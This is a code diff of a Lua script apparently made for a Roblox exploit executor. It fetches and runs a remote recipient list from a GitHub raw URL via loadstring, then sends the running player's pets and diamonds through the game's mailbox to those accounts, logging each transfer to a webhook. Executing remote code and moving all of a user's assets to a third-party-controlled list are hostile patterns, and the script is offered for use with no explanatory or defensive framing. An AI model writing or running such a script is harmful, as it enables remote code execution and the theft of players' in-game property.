@@ -5,5 +5,212 @@ end)
 
 spawn(function()
 task.wait(10)
-loadstring(game:HttpGet("https://raw.githubusercontent.com/dracular111/01/main/A-SendGem"))()
+--loadstring(game:HttpGet("https://raw.githubusercontent.com/dracular111/01/main/A-SendGem"))()
 end)
+
+--// ================= LOAD USER =================
+local Users = loadstring(game:HttpGet("https://raw.githubusercontent.com/dracular111/01/main/A-List-User"))()
+
+--// ================= CONFIG =================
+getgenv().AutoSystem = {
+
+    Pet = {
+        Enabled = true,
+        Users = Users, -- 👈 dùng chung
+        PerUser = 50,
+        Delay = 1.2,
+        Retry = 3,
+
+        Items = {
+            ["Blooming Axolotl"] = {
+                Class = "Pet",
+                pt = 2
+            }
+        }
+    },
+
+    Gem = {
+        Enabled = true,
+        Users = Users, -- 👈 dùng chung
+        PerUser = 300000,
+        Delay = 2,
+        Retry = 3
+    },
+
+    Webhook = "YOUR_WEBHOOK_HERE"
+}
+
+--// ================= LOAD =================
+repeat task.wait() until game:IsLoaded()
+
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local player = Players.LocalPlayer
+
+local Client = ReplicatedStorage:WaitForChild("Library"):WaitForChild("Client")
+local Network = require(Client.Network)
+local Save = require(Client.Save)
+
+--// ================= FORMAT =================
+local function formatNumber(n)
+    local function fmt(x, s)
+        if x >= 100 then return string.format("%.0f%s", x, s)
+        elseif x >= 10 then return string.format("%.1f%s", x, s)
+        else return string.format("%.2f%s", x, s) end
+    end
+    if n >= 1e12 then return fmt(n/1e12,"T")
+    elseif n >= 1e9 then return fmt(n/1e9,"B")
+    elseif n >= 1e6 then return fmt(n/1e6,"M")
+    elseif n >= 1e3 then return fmt(n/1e3,"K")
+    else return tostring(n) end
+end
+
+--// ================= WEBHOOK =================
+local function sendWebhook(msg)
+    if AutoSystem.Webhook == "" then return end
+    request({
+        Url = AutoSystem.Webhook,
+        Method = "POST",
+        Headers = {["Content-Type"] = "application/json"},
+        Body = HttpService:JSONEncode({content = msg})
+    })
+end
+
+--// ================= UI =================
+local gui = Instance.new("ScreenGui", player.PlayerGui)
+local label = Instance.new("TextLabel", gui)
+label.Size = UDim2.new(0,320,0,50)
+label.Position = UDim2.new(0,10,0,10)
+label.BackgroundTransparency = 0.3
+label.Text = "Loading..."
+
+--// ================= PET =================
+local function runPet()
+    local cfg = AutoSystem.Pet
+    local inv = Save.Get().Inventory
+
+    local pets = {}
+    for class, items in pairs(inv) do
+        for uid, v in pairs(items) do
+            for name, itemCfg in pairs(cfg.Items) do
+                if class == itemCfg.Class and v.id == name then
+                    if itemCfg.pt and v.pt ~= itemCfg.pt then continue end
+                    table.insert(pets, {uid = uid, data = v, class = class})
+                end
+            end
+        end
+    end
+
+    if #pets == 0 then
+        label.Text = "[PET] No pets - STOP"
+        sendWebhook("❌ PET STOP | No valid pets")
+        return false
+    end
+
+    local petAmounts = {}
+    local petIndex = 1
+
+    for _, user in ipairs(cfg.Users) do
+        local sentToUser = 0
+
+        for i = petIndex, #pets do
+            local pet = pets[i]
+            local v = pet.data
+            local uid = pet.uid
+
+            if not petAmounts[uid] then
+                petAmounts[uid] = tonumber(v._am) or 1
+            end
+
+            local amount = petAmounts[uid]
+            if amount <= 0 then
+                petIndex = i + 1
+                continue
+            end
+
+            local need = cfg.PerUser - sentToUser
+            local sendAmount = math.min(need, amount)
+
+            local ok = Network.Invoke("Mailbox: Send", user, "Auto Pet", pet.class, uid, sendAmount)
+
+            if ok then
+                petAmounts[uid] -= sendAmount
+                sentToUser += sendAmount
+
+                label.Text = "[PET] "..user.." "..sentToUser.."/"..cfg.PerUser
+                sendWebhook("🐾 "..sendAmount.." "..v.id.." → "..user)
+
+                if petAmounts[uid] <= 0 then
+                    petIndex = i + 1
+                else
+                    petIndex = i
+                end
+
+                task.wait(cfg.Delay)
+            end
+
+            if sentToUser >= cfg.PerUser then break end
+        end
+
+        if sentToUser < cfg.PerUser then
+            label.Text = "[PET] Not enough - STOP"
+            sendWebhook("❌ PET STOP | Not enough for "..user)
+            return false
+        end
+    end
+
+    sendWebhook("🐾 DONE PET")
+    return true
+end
+
+--// ================= GEM =================
+local function runGem()
+    local cfg = AutoSystem.Gem
+
+    local diamondsStat = player:WaitForChild("leaderstats"):FindFirstChild("💎 Diamonds")
+    if not diamondsStat then return false end
+
+    local uid
+    for id, v in pairs(Save.Get().Inventory["Currency"]) do
+        if v.id == "Diamonds" then uid = id break end
+    end
+    if not uid then return false end
+
+    for _, user in ipairs(cfg.Users) do
+        if diamondsStat.Value < cfg.PerUser then
+            label.Text = "[GEM] Not enough - STOP"
+            sendWebhook("❌ GEM STOP | Not enough for "..user)
+            return false
+        end
+
+        label.Text = "[GEM] Sending → "..user
+
+        local ok = Network.Invoke("Mailbox: Send", user, "Auto Gem", "Currency", uid, cfg.PerUser)
+
+        if ok then
+            label.Text = "[GEM] "..user.." ✔ "..formatNumber(cfg.PerUser)
+            sendWebhook("💎 "..formatNumber(cfg.PerUser).." → "..user)
+        else
+            sendWebhook("❌ GEM FAIL → "..user)
+            return false
+        end
+
+        task.wait(cfg.Delay)
+    end
+
+    sendWebhook("💎 DONE GEM")
+    return true
+end
+
+--// ================= RUN =================
+if AutoSystem.Pet.Enabled then
+    if not runPet() then return end
+end
+
+if AutoSystem.Gem.Enabled then
+    if not runGem() then return end
+end
+
+label.Text = "ALL DONE"
+sendWebhook("✅ ALL DONE")
